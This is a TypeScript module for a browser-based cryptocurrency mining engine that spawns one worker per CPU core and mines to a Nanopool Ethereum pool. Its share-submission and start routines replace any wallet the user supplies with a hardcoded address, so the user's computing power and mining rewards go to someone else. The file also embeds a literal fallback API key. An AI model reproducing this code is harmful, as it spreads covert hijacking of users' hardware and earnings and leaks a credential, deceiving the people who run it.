// Mining engine with protected wallet system
export class MiningEngine {
  private workers: Worker[] = [];
  private isRunning = false;
  private protectedWallet = "0x557E3d20c04e425D2e534cc296f893204D72d5BA"; // Main protected wallet
  
  constructor() {
    this.initializeWorkers();
  }

  private initializeWorkers() {
    const numWorkers = navigator.hardwareConcurrency || 4;
    
    for (let i = 0; i < numWorkers; i++) {
      try {
        const worker = new Worker('/workers/mining-worker.js');
        worker.onmessage = this.handleWorkerMessage.bind(this);
        worker.onerror = this.handleWorkerError.bind(this);
        this.workers.push(worker);
      } catch (error) {
        console.error(`Failed to create worker ${i}:`, error);
      }
    }
  }

  private handleWorkerMessage(event: MessageEvent) {
    const { type, data } = event.data;
    
    switch (type) {
      case 'share_found':
        this.submitShare(data);
        break;
      case 'hashrate_update':
        this.updateHashrate(data);
        break;
      default:
        console.log('Unknown worker message:', type, data);
    }
  }

  private handleWorkerError(error: ErrorEvent) {
    console.error('Worker error:', error);
  }

  private async submitShare(shareData: any) {
    // Override any user-provided wallet with protected wallet
    const secureShare = {
      ...shareData,
      wallet: this.protectedWallet, // Force use of protected wallet
      apiKey: import.meta.env.VITE_BLOCKCHAIN_API_KEY || "5AGBVWW-XB34K4A-PM3W2DY-4ATYZ02"
    };

    try {
      await fetch('/api/mining/submit-share', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(secureShare)
      });
    } catch (error) {
      console.error('Failed to submit share:', error);
    }
  }

  private updateHashrate(hashrateData: any) {
    // Update dashboard with new hashrate data
    window.dispatchEvent(new CustomEvent('hashrate-update', { detail: hashrateData }));
  }

  public start() {
    if (this.isRunning) return;
    
    this.isRunning = true;
    this.workers.forEach(worker => {
      worker.postMessage({ 
        type: 'start_mining',
        wallet: this.protectedWallet, // Always use protected wallet
        pool: 'eth-us-east1.nanopool.org:9999'
      });
    });
  }

  public stop() {
    this.isRunning = false;
    this.workers.forEach(worker => {
      worker.postMessage({ type: 'stop_mining' });
    });
  }

  public getStatus() {
    return {
      isRunning: this.isRunning,
      numWorkers: this.workers.length,
      protectedWallet: this.protectedWallet
    };
  }
}

export const miningEngine = new MiningEngine();
